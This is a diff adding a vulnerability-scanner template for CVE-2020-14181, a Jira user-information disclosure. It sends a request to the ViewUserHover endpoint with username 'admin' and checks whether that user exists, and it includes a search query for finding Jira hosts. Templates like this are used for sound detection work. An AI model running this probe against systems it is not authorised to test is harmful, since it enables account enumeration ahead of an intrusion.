@@ -1,0 +1,19 @@
+name: Atlassian Jira user information disclosure CVE-2020-14181
+manual: true
+query: app="jira" || product="JIRA" || body="jira"
+transport: http
+rules:
+  r0:
+    request:
+      method: GET
+      path: /secure/ViewUserHover.jspa?username=admin
+    expression: response.status == 200 && response.body.bcontains(b"admin")
+expression: r0()
+detail:
+  links:
+  - https://nvd.nist.gov/vuln/detail/CVE-2020-14181
+  description: JIRA is a defect tracking management system developed by Atlassian,
+    Australia, for commercial applications for defect management, task tracking, and
+    project management.The name JIRA is not an abbreviation, but a truncation of the
+    Japanese Gojira pronunciation.
+  tags: infoleak
